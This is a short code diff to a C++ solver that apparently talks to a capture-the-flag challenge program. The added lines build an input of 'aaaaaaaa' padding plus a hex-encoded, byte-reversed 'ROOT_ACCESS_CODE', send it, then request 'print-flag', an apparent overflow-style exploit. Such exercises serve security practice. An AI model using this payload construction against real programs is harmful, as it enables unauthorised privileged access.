@@ -85,6 +85,11 @@ int main(){
 	cin.tie(NULL);
 	
 	string s;
+	string t;
+	t += "aaaaaaaa";
+	t += "\x43\x43\x41\x5f\x54\x4f\x4f\x52";
+	t += "\x45\x44\x4f\x43\x5f\x53\x53\x45";
+	t += "aaaaaaaa";
 	
 	runcmd();
 	cmdin();
@@ -92,7 +97,7 @@ int main(){
 	cmdin();
 	cmdout("26");
 	cmdin();
-	cmdout("abcdefghijklmnopqrstuvwxyz");
+	cmdout(t);
 	cmdin();
 	cmdout("print-flag");
 	s = cmdin();
